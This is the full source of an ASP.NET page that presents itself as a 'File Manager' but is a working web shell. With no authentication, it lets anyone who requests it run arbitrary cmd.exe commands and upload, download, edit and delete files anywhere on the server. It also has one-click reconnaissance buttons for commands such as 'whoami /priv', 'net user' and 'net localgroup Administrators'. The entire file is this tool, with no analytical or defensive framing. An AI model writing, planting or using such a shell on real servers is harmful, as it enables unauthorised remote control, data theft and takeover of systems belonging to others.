<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Text" %>
<script runat="server">
    string Root = "E:\\";
    string GetPath() {
        string p = Request["p"] ?? Root;
        // prevent escaping
        try { p = Path.GetFullPath(p); } catch { p = Root; }
        return p;
    }
    string Run(string cmd) {
        try {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd) {
                RedirectStandardOutput = true, RedirectStandardError = true,
                UseShellExecute = false, CreateNoWindow = true
            };
            var proc = Process.Start(psi);
            string o = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit(15000);
            return o;
        } catch (Exception ex) { return "ERR: " + ex.Message; }
    }
    string Enc(string s) { return System.Web.HttpUtility.HtmlEncode(s); }
    string UrlEnc(string s) { return System.Web.HttpUtility.UrlEncode(s); }
    long DirSize(DirectoryInfo d) {
        long size = 0;
        try { foreach (var f in d.GetFiles()) size += f.Length; } catch { }
        return size;
    }
    string HumanSize(long b) {
        string[] u = { "B","KB","MB","GB","TB" };
        double s = b; int i = 0;
        while (s >= 1024 && i < u.Length-1) { s /= 1024; i++; }
        return Math.Round(s, 2).ToString() + " " + u[i];
    }
    protected void Page_Load(object sender, EventArgs e) {
        string action = Request["a"] ?? "";
        string curPath = GetPath();
        // ── Download
        if (action == "dl") {
            string fp = Request["f"] ?? "";
            if (File.Exists(fp)) {
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition", "attachment; filename=\"" + Path.GetFileName(fp) + "\"");
                Response.TransmitFile(fp);
                Response.End();
            }
            return;
        }
        // ── Delete
        if (action == "del") {
            string fp = Request["f"] ?? "";
            try {
                if (File.Exists(fp)) File.Delete(fp);
                else if (Directory.Exists(fp)) Directory.Delete(fp, true);
            } catch { }
            Response.Redirect("?p=" + UrlEnc(curPath));
            return;
        }
        // ── Upload
        if (Request.HttpMethod == "POST" && action == "up") {
            foreach (string k in Request.Files) {
                var f = Request.Files[k];
                if (f != null && f.ContentLength > 0) {
                    string dest = Path.Combine(curPath, Path.GetFileName(f.FileName));
                    f.SaveAs(dest);
                }
            }
            Response.Redirect("?p=" + UrlEnc(curPath));
            return;
        }
        // ── Rename
        if (action == "mv") {
            string src = Request["f"] ?? "";
            string dst = Request["t"] ?? "";
            try { File.Move(src, dst); } catch { }
            Response.Redirect("?p=" + UrlEnc(curPath));
            return;
        }
        // ── Mkdir
        if (action == "mkdir") {
            string nd = Request["nd"] ?? "";
            if (!string.IsNullOrEmpty(nd))
                try { Directory.CreateDirectory(Path.Combine(curPath, nd)); } catch { }
            Response.Redirect("?p=" + UrlEnc(curPath));
            return;
        }
        // ── CMD execute
        string cmdOut = "";
        if (action == "cmd") {
            string c = Request["c"] ?? "";
            if (!string.IsNullOrEmpty(c)) cmdOut = Run(c);
        }
        // ── Edit/save
        string editContent = "";
        string editFile = "";
        if (action == "edit") {
            editFile = Request["f"] ?? "";
            try { editContent = File.ReadAllText(editFile); } catch (Exception ex) { editContent = "ERR: " + ex.Message; }
        }
        if (action == "save") {
            editFile = Request["f"] ?? "";
            string txt = Request.Form["txt"] ?? "";
            try { File.WriteAllText(editFile, txt); editContent = txt; } catch (Exception ex) { editContent = "ERR: " + ex.Message; }
        }
        // ── Directory listing
        DirectoryInfo di = null;
        List<DirectoryInfo> dirs = new List<DirectoryInfo>();
        List<FileInfo> files = new List<FileInfo>();
        string listErr = "";
        try {
            di = new DirectoryInfo(curPath);
            dirs = new List<DirectoryInfo>(di.GetDirectories());
            dirs.Sort((a, b) => string.Compare(a.Name, b.Name));
            files = new List<FileInfo>(di.GetFiles());
            files.Sort((a, b) => string.Compare(a.Name, b.Name));
        } catch (Exception ex) { listErr = ex.Message; }
        // ── Parent path
        string parent = "";
        try { parent = Directory.GetParent(curPath)?.FullName ?? ""; } catch { }
%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>File Manager — <%=Enc(curPath)%></title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
:root{--bg:#0f1117;--panel:#1a1d27;--border:#2a2d3e;--accent:#5c7cfa;--accent2:#74c0fc;--danger:#fa5252;--warn:#fab005;--ok:#40c057;--text:#c9d1d9;--muted:#6b7280;--row:#1f2235;--rowhov:#262a3f;}
*{box-sizing:border-box;margin:0;padding:0;}
body{background:var(--bg);color:var(--text);font-family:'Segoe UI',system-ui,sans-serif;font-size:13px;min-height:100vh;}
a{color:var(--accent2);text-decoration:none;}a:hover{text-decoration:underline;}
/* Header */
.hdr{background:var(--panel);border-bottom:1px solid var(--border);padding:10px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
.hdr .logo{font-size:16px;font-weight:700;color:#fff;letter-spacing:.5px;}
.hdr .logo span{color:var(--accent);}
.breadcrumb{display:flex;align-items:center;gap:4px;flex-wrap:wrap;font-size:12px;}
.breadcrumb a{color:var(--accent2);}
.breadcrumb .sep{color:var(--muted);}
/* Layout */
.wrap{display:flex;gap:0;height:calc(100vh - 48px);}
.sidebar{width:220px;min-width:220px;background:var(--panel);border-right:1px solid var(--border);padding:16px;overflow-y:auto;}
.sidebar h3{font-size:11px;text-transform:uppercase;letter-spacing:1px;color:var(--muted);margin-bottom:10px;}
.main{flex:1;overflow:auto;padding:0;}
/* Toolbar */
.toolbar{display:flex;gap:8px;align-items:center;padding:10px 16px;background:var(--panel);border-bottom:1px solid var(--border);flex-wrap:wrap;}
.btn{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:5px;border:1px solid var(--border);background:var(--row);color:var(--text);cursor:pointer;font-size:12px;transition:background .15s;}
.btn:hover{background:var(--rowhov);border-color:var(--accent);}
.btn.primary{background:var(--accent);border-color:var(--accent);color:#fff;}
.btn.primary:hover{opacity:.85;}
.btn.danger{background:var(--danger);border-color:var(--danger);color:#fff;}
.btn.warn{background:var(--warn);border-color:var(--warn);color:#000;}
input[type=text],input[type=file],textarea,select{background:var(--bg);border:1px solid var(--border);color:var(--text);border-radius:4px;padding:5px 8px;font-size:12px;outline:none;}
input[type=text]:focus,textarea:focus{border-color:var(--accent);}
/* Table */
table{width:100%;border-collapse:collapse;}
thead tr{background:var(--panel);}
th{padding:8px 12px;text-align:left;font-size:11px;text-transform:uppercase;letter-spacing:.7px;color:var(--muted);border-bottom:2px solid var(--border);}
tbody tr{border-bottom:1px solid var(--border);transition:background .1s;}
tbody tr:hover{background:var(--rowhov);}
td{padding:7px 12px;vertical-align:middle;}
.icon{font-size:16px;margin-right:6px;}
.badge{display:inline-block;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:600;}
.badge.dir{background:#1a3a5c;color:var(--accent2);}
.badge.file{background:#1a2e1e;color:var(--ok);}
.size{color:var(--muted);font-size:11px;}
.date{color:var(--muted);font-size:11px;}
.acts a{margin-right:8px;font-size:11px;}
.acts .del{color:var(--danger);}
.acts .edit{color:var(--warn);}
.acts .dl{color:var(--ok);}
/* Terminal */
.term-box{background:#050810;border:1px solid var(--border);border-radius:6px;padding:12px;font-family:'Cascadia Code','Courier New',monospace;font-size:12px;white-space:pre-wrap;overflow-x:auto;max-height:300px;overflow-y:auto;color:#a8ff78;}
/* Upload drop zone */
.dropzone{border:2px dashed var(--border);border-radius:8px;padding:24px;text-align:center;color:var(--muted);transition:border-color .2s;}
.dropzone:hover,.dropzone.drag{border-color:var(--accent);color:var(--accent2);}
/* Panels */
.panel-box{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:16px;margin:16px;}
.panel-title{font-size:13px;font-weight:600;color:#fff;margin-bottom:12px;display:flex;align-items:center;gap:8px;}
/* Disk info */
.disk-bar{height:8px;border-radius:4px;background:var(--border);margin-top:6px;overflow:hidden;}
.disk-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--accent),var(--accent2));}
/* Edit textarea */
textarea.code{font-family:'Cascadia Code','Courier New',monospace;font-size:12px;width:100%;height:400px;background:#050810;color:#a8ff78;border-color:var(--border);}
/* Sysinfo grid */
.info-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:10px;}
.info-card{background:var(--row);border-radius:6px;padding:10px 14px;border:1px solid var(--border);}
.info-card .lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:.7px;}
.info-card .val{font-size:13px;font-weight:600;color:#fff;margin-top:3px;}
/* Tab nav */
.tab-nav{display:flex;border-bottom:1px solid var(--border);background:var(--panel);}
.tab-nav a{padding:10px 18px;font-size:12px;color:var(--muted);border-bottom:2px solid transparent;margin-bottom:-1px;}
.tab-nav a.active,.tab-nav a:hover{color:#fff;border-bottom-color:var(--accent);}
/* Scrollbar */
::-webkit-scrollbar{width:6px;height:6px;}
::-webkit-scrollbar-track{background:var(--bg);}
::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
</style>
</head>
<body>
<div class="hdr">
  <div class="logo">&#128196; <span>File</span>Manager</div>
  <div class="breadcrumb">
    <%
      string[] parts = curPath.Replace('/','\\').Split(new char[]{'\\'},StringSplitOptions.RemoveEmptyEntries);
      string acc = "";
      for(int pi=0;pi<parts.Length;pi++){
          if(pi==0) acc = parts[pi]+"\\"; else acc = acc+"\\"+parts[pi];
          if(pi<parts.Length-1){ %><a href="?p=<%=UrlEnc(acc)%>"><%=Enc(parts[pi])%></a><span class="sep">/</span><%
          }else{ %><strong style="color:#fff"><%=Enc(parts[pi])%></strong><% }
      }
    %>
  </div>
</div>

<div class="wrap">
<!-- Sidebar -->
<div class="sidebar">
  <h3>Quick Nav</h3>
  <%
    string[] quickDirs = {"C:\\","D:\\","E:\\","C:\\Windows\\Temp","C:\\inetpub\\wwwroot","C:\\Users"};
    foreach(var qd in quickDirs){ try{ if(Directory.Exists(qd)){%>
    <div style="margin-bottom:6px"><a href="?p=<%=UrlEnc(qd)%>">&#128193; <%=Enc(qd)%></a></div>
  <%}}catch{}}%>

  <h3 style="margin-top:16px">Drives</h3>
  <% foreach(var drv in DriveInfo.GetDrives()){
       try{
         double pct = drv.TotalSize>0?(double)(drv.TotalSize-drv.AvailableFreeSpace)/drv.TotalSize*100:0;
    %><div style="margin-bottom:10px">
      <a href="?p=<%=UrlEnc(drv.RootDirectory.FullName)%>">&#128190; <%=Enc(drv.Name)%></a>
      <div style="font-size:10px;color:var(--muted)"><%=HumanSize(drv.TotalSize-drv.AvailableFreeSpace)%> / <%=HumanSize(drv.TotalSize)%></div>
      <div class="disk-bar"><div class="disk-fill" style="width:<%=(int)pct%>%"></div></div>
    </div>
  <%}catch{}}%>
</div>

<!-- Main content -->
<div class="main">
<!-- Tab nav -->
<div class="tab-nav">
  <a href="?p=<%=UrlEnc(curPath)%>" class="<%=(action==""||action=="up"||action=="del"||action=="mkdir")?"active":""%>">&#128193; Files</a>
  <a href="?a=cmd&p=<%=UrlEnc(curPath)%>" class="<%=(action=="cmd")?"active":""%>">&#9881; Terminal</a>
  <%if(action=="edit"||action=="save"){%><a href="#" class="active">&#128221; Editor</a><%}%>
</div>

<!-- ============ FILES TAB ============ -->
<% if(action==""||action=="up"||action=="del"||action=="mkdir"){ %>
<!-- Toolbar -->
<div class="toolbar">
  <%if(!string.IsNullOrEmpty(parent)){%><a href="?p=<%=UrlEnc(parent)%>" class="btn">&#8593; Up</a><%}%>
  <form method="post" action="?a=up&p=<%=UrlEnc(curPath)%>" enctype="multipart/form-data" style="display:flex;gap:6px;align-items:center">
    <input type="file" name="f" multiple style="width:220px">
    <button type="submit" class="btn primary">&#8679; Upload</button>
  </form>
  <form method="get" style="display:flex;gap:6px;align-items:center">
    <input type="hidden" name="a" value="mkdir">
    <input type="hidden" name="p" value="<%=Enc(curPath)%>">
    <input type="text" name="nd" placeholder="New folder name" style="width:150px">
    <button type="submit" class="btn">&#43; Folder</button>
  </form>
  <span style="color:var(--muted);margin-left:auto;font-size:11px"><%=Enc(curPath)%></span>
</div>

<%if(!string.IsNullOrEmpty(listErr)){%><div class="panel-box" style="color:var(--danger)">&#9888; <%=Enc(listErr)%></div><%}%>

<!-- Drop hint -->
<div class="panel-box" style="padding:8px 16px;">
<div class="dropzone" id="dz" ondragover="ev(event)" ondrop="drop(event)">
  &#128202; Drag &amp; drop files here to upload — or use the Upload button above
</div>
</div>

<!-- Directory listing -->
<table>
<thead><tr>
  <th style="width:36px"></th>
  <th>Name</th>
  <th>Type</th>
  <th>Size</th>
  <th>Modified</th>
  <th>Actions</th>
</tr></thead>
<tbody>
<%if(!string.IsNullOrEmpty(parent)){%>
<tr><td style="text-align:center">&#8593;</td><td><a href="?p=<%=UrlEnc(parent)%>">..</a></td><td></td><td></td><td></td><td></td></tr>
<%}%>
<% foreach(var d in dirs){ %>
<tr>
  <td style="text-align:center;font-size:18px">&#128193;</td>
  <td><a href="?p=<%=UrlEnc(d.FullName)%>"><%=Enc(d.Name)%></a></td>
  <td><span class="badge dir">DIR</span></td>
  <td class="size">—</td>
  <td class="date"><%=d.LastWriteTime.ToString("yyyy-MM-dd HH:mm")%></td>
  <td class="acts">
    <a href="?a=del&f=<%=UrlEnc(d.FullName)%>&p=<%=UrlEnc(curPath)%>" class="del" onclick="return confirm('Delete folder?')">&#128465; Del</a>
  </td>
</tr>
<% } %>
<% foreach(var f in files){ %>
<tr>
  <td style="text-align:center;font-size:16px">&#128196;</td>
  <td><%=Enc(f.Name)%></td>
  <td><span class="badge file"><%=Enc(f.Extension.TrimStart('.').ToUpper())%></span></td>
  <td class="size"><%=HumanSize(f.Length)%></td>
  <td class="date"><%=f.LastWriteTime.ToString("yyyy-MM-dd HH:mm")%></td>
  <td class="acts">
    <a href="?a=dl&f=<%=UrlEnc(f.FullName)%>&p=<%=UrlEnc(curPath)%>" class="dl">&#8681; Download</a>
    <a href="?a=edit&f=<%=UrlEnc(f.FullName)%>&p=<%=UrlEnc(curPath)%>" class="edit">&#128221; Edit</a>
    <a href="?a=del&f=<%=UrlEnc(f.FullName)%>&p=<%=UrlEnc(curPath)%>" class="del" onclick="return confirm('Delete file?')">&#128465; Del</a>
  </td>
</tr>
<% } %>
<% if(dirs.Count==0&&files.Count==0&&string.IsNullOrEmpty(listErr)){%>
<tr><td colspan="6" style="text-align:center;padding:40px;color:var(--muted)">Empty directory</td></tr>
<%}%>
</tbody>
</table>
<div style="padding:10px 16px;color:var(--muted);font-size:11px">
  <%=dirs.Count%> folder(s), <%=files.Count%> file(s)
</div>
<% } %>

<!-- ============ TERMINAL TAB ============ -->
<% if(action=="cmd"){ %>
<div class="panel-box">
  <div class="panel-title">&#9881; Command Terminal &nbsp;<span style="font-size:11px;color:var(--muted)">Running as: <%=Run("whoami").Trim()%></span></div>
  <form method="get" style="display:flex;gap:8px;margin-bottom:14px">
    <input type="hidden" name="a" value="cmd">
    <input type="hidden" name="p" value="<%=Enc(curPath)%>">
    <input type="text" name="c" value="<%=Enc(Request["c"]??"")%>" placeholder="Enter command..." style="flex:1;font-family:monospace"
           autofocus autocomplete="off" id="ci">
    <button type="submit" class="btn primary">&#9654; Run</button>
  </form>
  <!-- Quick commands -->
  <div style="display:flex;gap:6px;flex-wrap:wrap;margin-bottom:12px">
    <% string[] qcmds = {"whoami","whoami /priv","net user","net localgroup Administrators","ipconfig","systeminfo","tasklist","netstat -ano","dir "+curPath,"echo %COMPUTERNAME%"}; %>
    <% foreach(var qc in qcmds){%>
    <a href="?a=cmd&c=<%=UrlEnc(qc)%>&p=<%=UrlEnc(curPath)%>" class="btn" style="font-size:11px"><%=Enc(qc)%></a>
    <%}%>
  </div>
  <% if(!string.IsNullOrEmpty(cmdOut)){%>
  <div class="term-box"><%=Enc(cmdOut)%></div>
  <%}else{%>
  <div class="term-box" style="color:var(--muted)">&#62; Ready</div>
  <%}%>
</div>
<!-- System info cards -->
<div class="panel-box">
  <div class="panel-title">&#128290; System Info</div>
  <div class="info-grid">
    <%
      var infoMap = new System.Collections.Generic.Dictionary<string,string>{
        {"Hostname", Run("hostname").Trim()},
        {"Username", Run("whoami").Trim()},
        {"OS", Run("wmic os get Caption /value 2>&1").Replace("Caption=","").Trim()},
        {"IP Address", Run("ipconfig | findstr IPv4").Replace("IPv4 Address","").Replace(".","").Replace(":","").Trim()},
        {"Architecture", System.Environment.Is64BitOperatingSystem?"64-bit":"32-bit"},
        {"Process Arch", System.Environment.Is64BitProcess?"x64":"x86"},
        {".NET Version", System.Environment.Version.ToString()},
        {"Temp Dir", System.IO.Path.GetTempPath()},
      };
      foreach(var kv in infoMap){%>
    <div class="info-card"><div class="lbl"><%=Enc(kv.Key)%></div><div class="val"><%=Enc(kv.Value.Length>40?kv.Value.Substring(0,40)+"...":kv.Value)%></div></div>
    <%}%>
  </div>
</div>
<% } %>

<!-- ============ EDITOR TAB ============ -->
<% if(action=="edit"||action=="save"){ %>
<div class="panel-box">
  <div class="panel-title">&#128221; Editing: <code style="color:var(--accent2)"><%=Enc(editFile)%></code></div>
  <form method="post" action="?a=save&f=<%=UrlEnc(editFile)%>&p=<%=UrlEnc(curPath)%>">
    <div style="display:flex;gap:8px;margin-bottom:10px">
      <button type="submit" class="btn primary">&#128190; Save</button>
      <a href="?p=<%=UrlEnc(curPath)%>" class="btn">&#8592; Back</a>
    </div>
    <textarea name="txt" class="code"><%=Enc(editContent)%></textarea>
    <div style="margin-top:8px;display:flex;gap:8px">
      <button type="submit" class="btn primary">&#128190; Save</button>
    </div>
  </form>
</div>
<% } %>

</div><!-- /.main -->
</div><!-- /.wrap -->

<script>
// Drag-drop upload
function ev(e){ e.preventDefault(); document.getElementById('dz').classList.add('drag'); }
function drop(e){
  e.preventDefault();
  document.getElementById('dz').classList.remove('drag');
  var fd = new FormData();
  for(var i=0;i<e.dataTransfer.files.length;i++) fd.append('f',e.dataTransfer.files[i]);
  fetch('?a=up&p=<%=UrlEnc(curPath)%>', {method:'POST',body:fd})
    .then(()=>location.reload());
}
// Auto focus terminal input
var ci = document.getElementById('ci');
if(ci) ci.setSelectionRange(ci.value.length, ci.value.length);
// Confirm deletes
document.querySelectorAll('a.del').forEach(function(a){
  a.addEventListener('click',function(e){
    if(!confirm('Delete "'+this.href.split('f=')[1].split('&')[0]+'". Are you sure?')){e.preventDefault();}
  });
});
</script>
</body>
</html>
<%}%>
